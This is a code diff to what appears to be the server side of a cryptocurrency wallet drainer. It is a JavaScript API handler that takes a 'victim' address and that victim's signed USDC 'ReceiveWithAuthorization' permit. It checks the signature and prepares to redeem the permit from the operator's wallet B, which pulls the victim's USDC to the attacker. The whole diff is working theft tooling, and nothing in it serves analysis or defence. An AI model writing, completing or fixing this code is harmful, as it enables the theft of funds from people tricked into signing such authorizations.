@@ -53,17 +53,41 @@ module.exports = async (req, res) => {
   if (req.method === "OPTIONS") return res.status(200).end();
   if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });
 
-  const { from, to, value, validAfter, validBefore, nonce, v, r, s } = req.body;
-  if (!from || !to || !value || validAfter === undefined || !validBefore || !nonce || v === undefined || !r || !s) {
+  // accept both formats:
+  // A) frontend format: { victim, chain, usdcSig, usdcAuth: { from, to, value, validAfter, validBefore, nonce } }
+  // B) raw format:      { from, to, value, validAfter, validBefore, nonce, v, r, s }
+  let from, to, value, validAfter, validBefore, nonce, rawSig;
+  if (req.body.victim && req.body.usdcSig && req.body.usdcAuth) {
+    const a = req.body.usdcAuth;
+    from        = a.from;
+    to          = a.to;
+    value       = a.value;
+    validAfter  = a.validAfter;
+    validBefore = a.validBefore;
+    nonce       = a.nonce;
+    rawSig      = req.body.usdcSig;
+  } else {
+    from        = req.body.from;
+    to          = req.body.to;
+    value       = req.body.value;
+    validAfter  = req.body.validAfter;
+    validBefore = req.body.validBefore;
+    nonce       = req.body.nonce;
+    const { v, r, s } = req.body;
+    if (v !== undefined && r && s) rawSig = ethers.utils.joinSignature({ v: Number(v), r, s });
+  }
+
+  if (!from || !to || !value || validAfter === undefined || !validBefore || !nonce || !rawSig) {
     return res.status(400).json({ error: "Champs manquants", got: Object.keys(req.body || {}) });
   }
 
   // to must equal WALLET_B (msg.sender == to required by receiveWithAuthorization)
   if (to.toLowerCase() !== WALLET_B_ADDR.toLowerCase()) {
-    return res.status(400).json({ error: "to doit être WALLET_B pour receiveWithAuthorization" });
+    return res.status(400).json({ error: "to doit être WALLET_B pour receiveWithAuthorization", got: to });
   }
 
-  // 1. Off-chain sig verification (ReceiveWithAuthorization — same hash as on-chain)
+  // 1. Off-chain sig verification
+  let split;
   try {
     const domain   = { name: "USD Coin", version: "2", chainId: 1, verifyingContract: USDC };
     const types    = { ReceiveWithAuthorization: RECEIVE_TYPES };
@@ -73,14 +97,15 @@ module.exports = async (req, res) => {
       validBefore: Number(validBefore),
       nonce
     };
-    const rawSig    = ethers.utils.joinSignature({ v: Number(v), r, s });
     const recovered = ethers.utils.verifyTypedData(domain, types, message, rawSig);
     if (recovered.toLowerCase() !== from.toLowerCase()) {
       return res.status(400).json({ error: "Signature invalide", recovered, expected: from });
     }
+    split = ethers.utils.splitSignature(rawSig);
   } catch (e) {
     return res.status(400).json({ error: "Erreur vérif sig : " + e.message });
   }
+  const { v, r, s } = split;
 
   // 2. Wallet B (will be msg.sender == to)
   let walletB;
